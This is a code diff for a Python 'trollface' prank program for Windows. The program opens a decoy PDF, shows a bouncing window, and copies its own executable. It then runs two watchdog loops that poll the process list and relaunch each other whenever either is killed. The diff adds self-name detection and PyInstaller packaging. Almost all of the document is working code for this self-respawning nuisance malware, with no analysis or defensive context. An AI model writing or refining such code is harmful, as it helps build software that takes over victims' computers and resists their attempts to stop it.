@@ -1,10 +1,11 @@
-import threading
-import subprocess
+from threading import Thread
+from subprocess import Popen, run
 import tkinter as tk
 import os
-import shutil
+from shutil import copyfile
 from pathlib import Path
 import sys
+from time import sleep
 
 
 class Bounce(tk.Toplevel):
@@ -48,34 +49,47 @@ def runw():
     win = Bounce(trollface, root)
     root.mainloop()
 
-def copy():
+def copy() -> str:
     file_path = Path("virabotcopy.exe")
     if file_path.exists():
         file_path.unlink()
-    current_file = os.path.abspath(sys.argv[0])
+    current_file = os.path.abspath(sys.executable)
     directory = os.path.dirname(current_file)
     base_name = os.path.basename(current_file)
     file_name, file_extension = os.path.splitext(base_name)
     new_file = f"{file_name}copy{file_extension}"
     new_file_path = os.path.join(directory, new_file)
-    shutil.copyfile(current_file, new_file_path)
+    copyfile(current_file, new_file_path)
     return new_file_path
 
+
+def get_resource_path(filename):
+    if getattr(sys, 'frozen', False):
+        return os.path.join(sys._MEIPASS, filename)
+    return os.path.join(os.path.dirname(__file__), filename)
+
+
 if __name__ == '__main__':
+    current_file = os.path.abspath(sys.executable)
+    base_name = os.path.basename(current_file)
+    file_name, _ = os.path.splitext(base_name)
+
     if len(sys.argv) > 1:
         while True:
-            output = subprocess.run(['tasklist'], shell=True, capture_output=True).stdout
-            c = str(output).find('virabot.exe')
+            output = run(['tasklist'], shell=True, capture_output=True).stdout
+            c = str(output).find(f'{file_name}.exe')
             if c == -1:
-                subprocess.Popen('virabot.exe')
+                Popen(f'{file_name}.exe')
     else:
-        copy = copy()
-        t1 = threading.Thread(target=runw)
+        os.startfile(get_resource_path("calmdown.pdf"))
+        sleep(5)
+
+        copy: str = copy()
+        t1 = Thread(target=runw)
         t1.start()
 
-
         while True:
-            output = subprocess.run(['tasklist'], shell=True, capture_output=True).stdout
-            c = str(output).find('virabotcopy.exe')
+            output = run(['tasklist'], shell=True, capture_output=True).stdout
+            c = str(output).find(f'{file_name}copy.exe')
             if c == -1:
-                subprocess.Popen([copy, 'virabotcopy'])
+                Popen([copy, f'{file_name}copy'])
